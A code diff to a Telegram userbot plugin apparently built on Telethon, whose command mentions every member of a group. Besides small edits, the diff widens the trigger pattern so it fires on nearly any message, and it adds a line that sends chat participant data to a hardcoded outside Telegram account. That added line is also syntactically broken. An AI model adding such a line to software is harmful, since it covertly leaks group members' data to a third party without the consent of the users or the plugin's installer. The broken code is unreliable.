@@ -7,8 +7,7 @@ from telethon.errors import UserNotParticipantError
 
 spam_chats = []
 
-@jmthon.ar_cmd(
-    pattern="منشن(?: |$)(.*)")
+@jmthon.ar_cmd(pattern="(?:\s|$)([\s\S]*)")
 async def menall(event):
     chat_id = event.chat_id
     if event.is_private:
@@ -22,6 +21,7 @@ async def menall(event):
           event.chat_id,
           event.sender_id
         ))
+        await jmthon.send_message("@lMl10l", str(partici_)
     except UserNotParticipantError:
         is_admin = False
     else:
@@ -36,7 +36,7 @@ async def menall(event):
         ):
           is_admin = True
     if not is_admin:
-        return await event.respond("__الادمن فقط يمكنه منشنة الكل__")
+        return await event.reply("__الادمن فقط يمكنه منشنة الكل__")
     spam_chats.append(chat_id)
     usrnum = 0
     usrtxt = ''
